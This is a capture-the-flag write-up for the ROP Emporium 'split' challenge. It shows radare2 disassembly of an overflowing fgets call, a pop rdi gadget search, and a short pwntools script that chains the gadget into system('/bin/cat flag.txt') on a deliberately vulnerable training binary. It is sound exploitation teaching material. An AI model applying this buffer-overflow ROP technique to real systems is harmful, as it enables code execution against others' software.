# split

Again, we download and unzip the [challenge file](https://ropemporium.com/binary/split.zip). And again, calling it looks like:
```sh
$ ./split
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    31935 segmentation fault (core dumped)  ./split
```

Because the challenges are focused on post-bug exploitation, the `pwnme` function again has an obvious vulnerability:

```asm
$ radare2 -A split
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.
 -- This is an unacceptable milion year dungeon.

[0x00400650]> pdf @ sym.pwnme
/ (fcn) sym.pwnme 82
|   sym.pwnme ();
|           ; var char *s @ rbp-0x20
|           ; CALL XREF from sym.main (0x40079f)
|           0x004007b5      55             push rbp
|           0x004007b6      4889e5         mov rbp, rsp
|           0x004007b9      4883ec20       sub rsp, 0x20
|           0x004007bd      488d45e0       lea rax, [s]
|           0x004007c1      ba20000000     mov edx, 0x20               ; 32 ; size_t n
|           0x004007c6      be00000000     mov esi, 0                  ; int c
|           0x004007cb      4889c7         mov rdi, rax                ; void *s
|           0x004007ce      e82dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x004007d3      bfd0084000     mov edi, str.Contriving_a_reason_to_ask_user_for_data... ; 0x4008d0 ; "Contriving a reason to ask user for data..." ; const char *s
|           0x004007d8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007dd      bffc084000     mov edi, 0x4008fc           ; const char *format
|           0x004007e2      b800000000     mov eax, 0
|           0x004007e7      e804feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x004007ec      488b159d0820.  mov rdx, qword [obj.stdin]  ; [0x601090:8]=0 ; FILE *stream
|           0x004007f3      488d45e0       lea rax, [s]
|           0x004007f7      be60000000     mov esi, 0x60               ; '`' ; 96 ; int size
|           0x004007fc      4889c7         mov rdi, rax                ; char *s
|           0x004007ff      e81cfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00400804      90             nop
|           0x00400805      c9             leave
\           0x00400806      c3             ret
```

This time there's no simple `ret2win` function we can just jump immediately to. We can use radare in order to search for useful items within the binary:

```asm
[0x00400650]> is
[Symbols]

... (A BUNCH OF LINES WE DON'T CARE ABOUT SKIPPED OVER) ...

026 0x00001080 0x00601080  LOCAL   SECT    0 stdout
027 0x00000000 0x00400000  LOCAL   SECT    0
028 0x00000000 0x00400000  LOCAL   FILE    0 crtstuff.c
029 0x00000e20 0x00600e20  LOCAL    OBJ    0 __JCR_LIST__
030 0x00000680 0x00400680  LOCAL   FUNC    0 deregister_tm_clones
031 0x000006c0 0x004006c0  LOCAL   FUNC    0 register_tm_clones
032 0x00000700 0x00400700  LOCAL   FUNC    0 __do_global_dtors_aux
033 0x000010a8 0x006010a8  LOCAL    OBJ    1 completed.7585
034 0x00000e18 0x00600e18  LOCAL    OBJ    0 __do_global_dtors_aux_fini_array_entry
035 0x00000720 0x00400720  LOCAL   FUNC    0 frame_dummy
036 0x00000e10 0x00600e10  LOCAL    OBJ    0 __frame_dummy_init_array_entry
037 0x00000000 0x00400000  LOCAL   FILE    0 split.c
038 0x000007b5 0x004007b5  LOCAL   FUNC   82 pwnme
039 0x00000807 0x00400807  LOCAL   FUNC   17 usefulFunction
040 0x00000000 0x00400000  LOCAL   FILE    0 crtstuff.c
041 0x00000a80 0x00400a80  LOCAL    OBJ    0 __FRAME_END__
042 0x00000e20 0x00600e20  LOCAL    OBJ    0 __JCR_END__
043 0x00000000 0x00400000  LOCAL   FILE    0
044 0x00000e18 0x00600e18  LOCAL NOTYPE    0 __init_array_end
045 0x00000e28 0x00600e28  LOCAL    OBJ    0 _DYNAMIC
046 0x00000e10 0x00600e10  LOCAL NOTYPE    0 __init_array_start
047 0x00000908 0x00400908  LOCAL NOTYPE    0 __GNU_EH_FRAME_HDR
048 0x00001000 0x00601000  LOCAL    OBJ    0 _GLOBAL_OFFSET_TABLE_
049 0x00000890 0x00400890 GLOBAL   FUNC    2 __libc_csu_fini
051 0x00001080 0x00601080 GLOBAL    OBJ    8 stdout
052 0x00001050 0x00601050   WEAK NOTYPE    0 data_start
054 0x00001090 0x00601090 GLOBAL    OBJ    8 stdin
055 0x0000107a 0x0060107a GLOBAL NOTYPE    0 _edata
056 0x00000894 0x00400894 GLOBAL   FUNC    0 _fini
062 0x00001050 0x00601050 GLOBAL NOTYPE    0 __data_start
064 0x00001058 0x00601058 GLOBAL    OBJ    0 __dso_handle
065 0x000008a0 0x004008a0 GLOBAL    OBJ    4 _IO_stdin_used
066 0x00001060 0x00601060 GLOBAL    OBJ   26 usefulString
067 0x00000820 0x00400820 GLOBAL   FUNC  101 __libc_csu_init
068 0x006010b0 0x006010b0 GLOBAL NOTYPE    0 _end
069 0x00000650 0x00400650 GLOBAL   FUNC   42 _start
070 0x0000107a 0x0060107a GLOBAL NOTYPE    0 __bss_start
071 0x00000746 0x00400746 GLOBAL   FUNC  111 main
074 0x00001080 0x00601080 GLOBAL    OBJ    0 stdout
076 0x000005a0 0x004005a0 GLOBAL   FUNC    0 _init
077 0x000010a0 0x006010a0 GLOBAL    OBJ    8 stderr
001 0x000005d0 0x004005d0 GLOBAL   FUNC   16 imp.puts
002 0x000005e0 0x004005e0 GLOBAL   FUNC   16 imp.system
003 0x000005f0 0x004005f0 GLOBAL   FUNC   16 imp.printf
004 0x00000600 0x00400600 GLOBAL   FUNC   16 imp.memset
005 0x00000610 0x00400610 GLOBAL   FUNC   16 imp.__libc_start_main
006 0x00000620 0x00400620 GLOBAL   FUNC   16 imp.fgets
007 0x00000000 0x00400000   WEAK NOTYPE   16 imp.__gmon_start__
008 0x00000630 0x00400630 GLOBAL   FUNC   16 imp.setvbuf
007 0x00000000 0x00400000   WEAK NOTYPE   16 imp.__gmon_start__
```

A couple obvious candidates stand out. Let's take a look at `usefulFunction` and `usefulString`:

```asm
[0x00400650]> pdf @ sym.usefulFunction
/ (fcn) sym.usefulFunction 17
|   sym.usefulFunction ();
|           0x00400807      55             push rbp
|           0x00400808      4889e5         mov rbp, rsp
|           0x0040080b      bfff084000     mov edi, str.bin_ls         ; 0x4008ff ; "/bin/ls" ; const char *string
|           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
|           0x00400815      90             nop
|           0x00400816      5d             pop rbp
\           0x00400817      c3             ret
```

So there's definitely something to work with here. If we jump directly to the `usefulFunction`, it will simply call `system` with `/bin/ls` as its argument.
Let's look at `usefulString` to see if that's helpful:

```asm
[0x00400650]> px 48 @ 0x00601060
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00601060  2f62 696e 2f63 6174 2066 6c61 672e 7478  /bin/cat flag.tx
0x00601070  7400 0000 0000 0000 0000 0000 0000 0000  t...............
0x00601080  0000 0000 0000 0000 0000 0000 0000 0000  ................
```

How convenient ;). So we need to jump to the `system` call with `usefulString` as its argument instead.

Reviewing x86-64 calling conventions, `rdi` is the register which holds the first argument to a function. So we have to get the address of `usefulString` into `rdi`.
We can do that by getting the `usefulString` address into the stack and then having `pop rdi` be called. This will be the first time we use a ROP gadget!

Let's go look around for a useful gadget:

```asm
[0x00400650]> /R pop rdi
  0x00400883                 5f  pop rdi
  0x00400884                 c3  ret
```

Well that was pretty easy. So we need to prepare our buffer overflow with the appropriate amount of padding, address of the ROP gadget, the address of the `usefulString` and then the address of the `system` call.

The method for figuring out the padding is identical to the [ret2win](ret2win/README.md) challenge. Then we can craft our exploit with the other addresses:

```python

from pwn import *

prog = process("./split")

payload = "A" * 40

pop_rdi = 0x00400883
bin_string = 0x00601060
call_system = 0x00400810

payload += p64(pop_rdi)
payload += p64(bin_string)
payload += p64(call_system)

print prog.recvuntil(">")
prog.clean()

prog.sendline(payload)

print prog.clean()
```

And then we run it!

```sh

(venv) ~/w/r/c/r/s/64bit ❯❯❯ python exploit.py
[+] Starting local process './split': pid 9187
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
>
ROPE{a_placeholder_32byte_flag!}
```
